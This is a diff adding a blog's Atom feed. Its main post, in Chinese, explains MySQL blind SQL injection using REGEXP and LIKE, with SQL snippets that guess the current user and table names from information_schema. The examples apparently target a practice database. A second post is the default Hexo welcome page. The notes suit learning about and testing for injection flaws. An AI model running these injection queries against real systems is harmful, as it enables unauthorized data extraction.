@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Bey0nd&#39;s Blog</title>
+  <subtitle>Bey0nd&#39;s Blog</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="https://ibey0nd.github.io/"/>
+  <updated>2017-06-27T03:57:23.163Z</updated>
+  <id>https://ibey0nd.github.io/</id>
+  
+  <author>
+    <name>Bey0nd</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>title</title>
+    <link href="https://ibey0nd.github.io/2017/mysql-regexp-sqli/"/>
+    <id>https://ibey0nd.github.io/2017/mysql-regexp-sqli/</id>
+    <published>2017-06-27T02:59:56.000Z</published>
+    <updated>2017-06-27T03:57:23.163Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="使用regexp来进行注入"><a href="#使用regexp来进行注入" class="headerlink" title="使用regexp来进行注入"></a>使用regexp来进行注入</h2><blockquote>
+<p>匹配到则返回1，否则返回0</p>
+<h6 id="这条语句返回1"><a href="#这条语句返回1" class="headerlink" title="这条语句返回1"></a>这条语句返回1</h6></blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>( ) REGEXP<span class="string">'^root'</span></div></pre></td></tr></table></figure>
+<p>猜解user()<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">if</span>((<span class="keyword">user</span>() regexp <span class="string">'^r'</span>),<span class="number">1</span>,<span class="number">0</span>));</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">user</span>() regexp<span class="string">'^ri'</span>);</div></pre></td></tr></table></figure></p>
+<p>猜解表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables</div><div class="line"><span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^us[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>);</div></pre></td></tr></table></figure>
+<p>这条语句如果匹配到则返回1，否则返回空白<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables</div><div class="line"><span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^us[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></div></pre></td></tr></table></figure></p>
+<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>同样的根据like也可以注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT USER() LIKE &quot;%ros%&quot;</div></pre></td></tr></table></figure>
+<p>匹配则返回1，否则0</p>
+<div class="tip"><br>    预处理器很强大，但它只是编写 CSS 的辅助工具。出于对扩展和维护等方面的考虑，在大型项目中有必要使用预处理器构建 CSS；但是对于小型项目，原生的 CSS 可能是一种更好的选择。不要肆意使用预处理器！<br></div>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;使用regexp来进行注入&quot;&gt;&lt;a href=&quot;#使用regexp来进行注入&quot; class=&quot;headerlink&quot; title=&quot;使用regexp来进行注入&quot;&gt;&lt;/a&gt;使用regexp来进行注入&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;匹配到则返回1，否则返回0
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="https://ibey0nd.github.io/2017/hello-world/"/>
+    <id>https://ibey0nd.github.io/2017/hello-world/</id>
+    <published>2017-06-27T02:53:23.962Z</published>
+    <updated>2017-06-27T04:08:24.637Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.<br><a id="more"></a></p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;.&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+</feed>
